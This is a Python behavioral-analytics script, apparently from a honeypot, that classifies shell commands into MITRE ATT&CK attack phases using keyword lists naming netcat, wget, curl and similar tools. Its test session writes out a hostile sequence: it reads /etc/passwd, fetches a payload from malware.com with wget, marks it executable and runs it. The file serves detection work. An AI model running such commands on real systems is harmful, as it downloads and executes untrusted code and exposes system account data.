#!/usr/bin/env python3
"""
Behavioral Analytics - MITRE ATT&CK Mapping
Clusters commands into attack phases
"""

import json
from collections import defaultdict

class BehavioralAnalytics:
    def __init__(self):
        self.attack_patterns = {
            'recon': ['uname', 'whoami', 'id', 'cat /etc/', 'ls', 'pwd', 'hostname', 'ifconfig', 'ip addr'],
            'persistence': ['wget', 'curl', 'chmod +x', 'nohup', 'crontab', 'systemctl', 'service'],
            'data_theft': ['scp', 'tar', 'zip', 'gzip', 'base64', 'nc', 'netcat'],
            'lateral_movement': ['ssh', 'telnet', 'ftp', 'smbclient'],
            'execution': ['bash', 'sh', 'python', 'perl', 'ruby', './']
        }
        
        self.mitre_mapping = {
            'recon': 'T1082 - System Information Discovery',
            'persistence': 'T1053 - Scheduled Task/Job',
            'data_theft': 'T1560 - Archive Collected Data',
            'lateral_movement': 'T1021 - Remote Services',
            'execution': 'T1059 - Command and Scripting Interpreter'
        }
    
    def classify_command(self, command):
        """Classify command into attack phase"""
        command_lower = command.lower()
        
        for phase, patterns in self.attack_patterns.items():
            if any(pattern in command_lower for pattern in patterns):
                return {
                    'phase': phase,
                    'mitre_technique': self.mitre_mapping[phase],
                    'severity': self.get_severity(phase)
                }
        
        return {'phase': 'unknown', 'mitre_technique': 'Unknown', 'severity': 'low'}
    
    def get_severity(self, phase):
        """Assign severity based on attack phase"""
        severity_map = {
            'recon': 'low',
            'persistence': 'high',
            'data_theft': 'critical',
            'lateral_movement': 'high',
            'execution': 'medium'
        }
        return severity_map.get(phase, 'low')
    
    def analyze_session(self, commands):
        """Analyze full session for attack progression"""
        phases = []
        for cmd in commands:
            classification = self.classify_command(cmd)
            phases.append(classification['phase'])
        
        # Detect attack progression
        unique_phases = list(dict.fromkeys(phases))  # Preserve order
        
        return {
            'attack_progression': unique_phases,
            'sophistication': self.calculate_sophistication(unique_phases),
            'threat_level': self.calculate_threat_level(phases)
        }
    
    def calculate_sophistication(self, phases):
        """Calculate attacker sophistication"""
        if len(phases) >= 4:
            return 'advanced'
        elif len(phases) >= 2:
            return 'intermediate'
        else:
            return 'basic'
    
    def calculate_threat_level(self, phases):
        """Calculate overall threat level"""
        if 'data_theft' in phases or 'persistence' in phases:
            return 'critical'
        elif 'lateral_movement' in phases:
            return 'high'
        elif 'execution' in phases:
            return 'medium'
        else:
            return 'low'

if __name__ == "__main__":
    analytics = BehavioralAnalytics()
    
    # Test session
    test_commands = [
        'uname -a',
        'cat /etc/passwd',
        'wget http://malware.com/payload',
        'chmod +x payload',
        './payload'
    ]
    
    print("Command Classifications:")
    for cmd in test_commands:
        result = analytics.classify_command(cmd)
        print(f"{cmd}: {result}")
    
    print("\nSession Analysis:")
    session_analysis = analytics.analyze_session(test_commands)
    print(json.dumps(session_analysis, indent=2))
